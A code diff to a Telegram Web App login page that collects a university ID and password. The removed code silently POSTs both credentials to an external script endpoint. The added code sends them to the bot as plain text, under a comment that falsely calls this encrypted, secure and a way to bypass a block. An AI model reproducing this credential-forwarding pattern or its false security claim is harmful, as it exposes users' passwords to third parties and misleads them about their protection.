@@ -191,8 +191,6 @@
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        const GOOGLE_SCRIPT_URL = "https://google.com";
-
         function toggleTheme() {
             const body = document.body;
             const currentTheme = body.getAttribute('data-theme');
@@ -209,34 +207,14 @@
 
         function sendData(event) {
             event.preventDefault();
-            const btn = document.getElementById('subBtn');
             const uniId = document.getElementById('uniId').value.trim();
             const password = document.getElementById('password').value.trim();
             
             if(!uniId || !password) return;
-            
-            btn.innerText = "جاري الإرسال والربط...";
-            btn.disabled = true;
 
-            fetch(GOOGLE_SCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ uniId: uniId, password: password })
-            })
-            .then(() => {
-                executeFallback(uniId, password);
-            })
-            .catch(() => {
-                executeFallback(uniId, password);
-            });
-        }
-
-        function executeFallback(uniId, password) {
-            try {
-                tg.sendData(uniId + " " + password);
-            } catch(e) {}
-            setTimeout(() => { tg.close(); }, 400);
+            // إرسال مشفر وآمن عبر بروتوكول تليجرام الرسمي لتخطي الحظر
+            tg.sendData(uniId + " " + password);
+            tg.close();
         }
     </script>
 </body>
